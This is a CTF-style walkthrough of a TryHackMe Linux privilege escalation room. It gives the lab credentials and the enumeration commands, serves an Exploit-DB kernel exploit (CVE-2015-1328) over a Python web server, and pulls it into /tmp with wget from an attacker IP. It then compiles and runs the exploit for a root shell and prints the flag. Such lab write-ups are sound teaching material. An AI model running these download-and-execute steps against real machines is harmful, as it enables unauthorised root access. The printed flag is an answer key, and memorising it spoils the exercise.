# Privilege Escalation:Kernel Exploits

By: Onyedikachi Okoh Bernard 

**Note:** 
This CTF challenge is a guided exercise provided by [**TryHackMe.com**](http://TryHackMe.com), designed to help learners practice and understand Linux privilege escalation techniques in a safe, controlled environment.
Launch the target machine attached to this task to follow along.

You can access the machine directly from your browser, or via SSH using the low-privilege credentials provided below:

- **Username:** karen
- **Password:** Password1

**Understanding the Goal**

---

Privilege escalation aims to elevate access, ideally to **root**. This can be achieved through:

- Exploiting a direct vulnerability, or
- Gaining access to another user account with higher privileges, better access, or more valuable information.

In most cases, privilege escalation relies on **misconfigurations** and **weak permissions**, unless a single vulnerability directly grants a root shell.

---

### **Why Kernel Exploits Matter**

The Linux kernel handles critical system tasks such as memory management, hardware–software communication, and process control. Because of this, the kernel operates with **high-level privileges**.

Therefore, a successful kernel exploit can often result in **root access**.

---

### **Kernel Exploitation Methodology**

The general approach for Kernel exploits is straightforward:

1. **Identify the kernel version.**
2. **Search for an exploit** targeting that exact version.
3. **Execute the exploit** on the target system.

Although the process seems simple, remember:

❗ **A failed kernel exploit can crash the system.**

Only attempt kernel exploitation if a system crash is acceptable within the scope of your penetration test.

---

### **Useful Research Sources**

When searching for kernel vulnerabilities, use any of the following:

- **Google** – Search based on the kernel version and keywords like "privilege escalation exploit".
- **CVE Details** – Helpful for identifying known vulnerabilities.
- **Linux Exploit Suggester (LES)** – Automates detection, but may produce:
    - **False positives** (reports vulnerabilities that do not apply),
    - **False negatives** (misses applicable vulnerabilities).

---

### **Important Notes and Best Practices**

- **Avoid being too specific** when searching for exploits.
    
    Broader searches often return more relevant results.
    
- **Always understand the exploit before running it.**
    
    Some exploits modify system configurations permanently or introduce security risks. While such issues are acceptable in labs or CTFs, they are unacceptable in real-world engagements.
    
- **Some exploits require additional interaction.**
    
    Always read all comments, instructions, and usage notes included with the exploit code.
    
- **Transferring exploit files:**
    
    You can transfer exploit code from your machine to the target using:
    
    - **Python’s SimpleHTTPServer/HTTP.server** module on your machine, and
    - **wget** on the target system.

find and use the appropriate kernel exploit to gain root privileges on the target system.

What is the content of the flag1.txt file?

### **1. Connecting to the Target Machine**

First, you need to connect to the target machine. You can either:

- Access it **directly from THM provided machine or,**
- Connect through your own terminal using SSH with the provided credentials.

---

### **2. Initial Enumeration**

Before attempting any privilege escalation, begin by gathering basic information about the system.

A good starting point is verifying the hostname and identifying kernel details.

Use the following commands:

```bash
$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

![A1.png](A1.png)

- `hostname` displays the system’s name on the network.
- `uname -a` provides detailed information about the operating system and kernel version, which is crucial for identifying potential kernel vulnerabilities.

### **3. Verifying the Kernel Version**

Next, we need to identify the exact kernel version running on the target machine. This is a critical step in privilege escalation because many kernel exploits are version-specific.

```bash
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

Linux 3.13.0
```

![A2.png](A2.png)

From the results, we can see that the target system is running **Linux kernel version 3.13.0**. This kernel version is what we will look up on Exploit-DB to identify any known vulnerabilities that may be exploitable.

We can also observe that the system has **GCC version 4.8.2** installed, which is useful because many kernel exploits require compiling C source code directly on the target machine.

Additionally, we can gather more information about the operating system by reading the `/etc/issue` file:

```bash
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l
```

![Screenshot_2025-11-13_18-44-44.png](Screenshot_2025-11-13_18-44-44.png)

This file typically displays the OS name and release information, and it is also shown automatically when you first connect to the machine.

### **4. Exploring Additional System Information**

Next, let’s explore more details about the target system—specifically, the Python versions installed. This is important because some exploits require Python to run, and certain payloads may only work on specific Python versions.

To check the available Python versions, you can run:

```bash
$ python --version
Python 2.7.6
$ python3 --version
Python 3.4.0
$ python
Python 2.7.6 (default, Mar 22 2014, 22:59:56) 
[GCC 4.8.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

![A#.png](A.png)

This will show you which versions of Python are installed and available for use. Knowing this helps determine whether certain Python-based privilege escalation scripts or utilities can be executed on the target machine.

From the results, we can see that **two Python versions are available on the target system**, but the TryHackMe task environment only accepts and supports **Python 2.7.6**, which is the version we will be using for our exploitation steps.

### **5. Searching for Kernel Vulnerabilities**

Now that we have identified the kernel version, the next step is to look for vulnerabilities that affect **Linux Kernel 3.13.0**. To do this, we will search Exploit-DB for publicly available exploits.

1. Visit **Exploit-DB**.
2. In the search bar, type:

![A4.png](A4.png)

![A5.png](A5.png)

This will display all known exploits associated with this kernel version. From there, we can review the available exploits, read their descriptions, and determine which one is suitable for our target environment.

From the search results, we identified a kernel vulnerability associated with **CVE-2015-1328**, which corresponds to the exploit with **EDB-ID 37292** on Exploit-DB.

This is the exploit we will use for privilege escalation.

The next step is to **download the exploit onto our attacking machine**. After downloading it, we will **start a simple web server** on the attacking machine so that we can transfer the exploit code to the target system. Once the exploit is on the target machine, we can execute it in order to potentially gain **root access**.

### **Setting Up a Web Server**

Next, we need to set up an active web server on our attacking machine so the exploit can be transferred to the target system.

We can use Python for this purpose. Although Python 2 or Python 3 can be used, we will proceed with **Python 3**:

```bash
python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...

```

![a1.png](a1.png)

### **7. Downloading the Exploit on the Target Machine**

On the target machine, we will navigate to the **/tmp directory**, which is typically the only **world-writable** directory available for all users. This makes it the safest place to store and execute exploit files without permission issues.

Replace **ATTACKER_IP** with your actual IP address.

This will pull the `37292.c` exploit file from your Python web server into the target machine for compilation and execution.
Once inside `/tmp`, we can download the exploit from our attacking machine using the `wget` command.

Use the following command:

```bash
$ cd /tmp
$ wget 10.11.147.161:8081/37292.c
--2025-11-13 19:16:52--  http://10.11.147.161:8081/37292.c
Connecting to 10.11.147.161:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: ‘37292.c’

100%[===============================================>] 5,119       --.-K/s   in 0.008s  

2025-11-13 19:16:52 (600 KB/s) - ‘37292.c’ saved [5119/5119]
$ 
```

![a2.png](a2.png)

### **8. Compiling and Running the Exploit**

After successfully downloading the exploit onto the target machine, the next step is to **compile** the exploit code using GCC. Since the target system already has GCC installed, we can compile the exploit with the following command:

```bash
$ gcc 37292.c -o 37292
$ ./37292
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# 
```

![a3.png](a3.png)

This command compiles the C source file (`37292.c`) into an executable named `37292`.

Once the compilation is complete, run the exploit: ./37292

If the exploit works successfully, it should grant you a **root shell**, which you can recognize by the prompt changing to:#
his indicates you now have full root privileges on the target machine.

### **9. Verifying Root Access and Retrieving the Flag**

After executing the exploit, you should now have a **root shell**. To confirm this, run: whoami

You can go a step further by checking your user and group IDs.

Once confirmed, you now have full root privileges and can proceed to retrieve the flag. For example, if the task requires accessing `flag1.txt`, navigate to its location and display its contents: cat  /home/matt/flag1.txt

```bash
# whoami
root
# cat /home/matt/flag1.txt
THM-28392872729920
```

![a4.png](a4.png)